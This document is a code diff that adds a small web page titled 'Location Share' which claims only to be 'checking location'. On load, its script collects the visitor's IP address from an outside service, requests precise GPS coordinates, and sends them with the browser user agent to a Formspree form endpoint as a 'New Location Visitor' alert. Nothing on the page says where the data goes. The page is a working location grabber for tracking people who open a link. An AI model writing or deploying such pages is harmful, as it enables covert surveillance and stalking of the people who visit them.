@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Share</title>
+</head>
+<body>
+  <h1>Checking location...</h1>
+
+  <script>
+    function sendToEmail(lat, lon, ip) {
+      const data = {
+        _subject: "New Location Visitor",
+        latitude: lat,
+        longitude: lon,
+        ip: ip,
+        userAgent: navigator.userAgent
+      };
+
+      fetch("https://formspree.io/f/xanegdon", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(response => {
+        document.body.innerHTML = "<h2>Thanks! Your location was shared successfully.</h2>";
+      }).catch(error => {
+        document.body.innerHTML = "<h2>Something went wrong.</h2>";
+      });
+    }
+
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendToEmail(lat, lon, ip);
+          }, error => {
+            document.body.innerHTML = "<h2>Location permission denied.</h2>";
+          });
+        } else {
+          document.body.innerHTML = "<h2>Geolocation is not supported.</h2>";
+        }
+      });
+  </script>
+</body>
+</html>
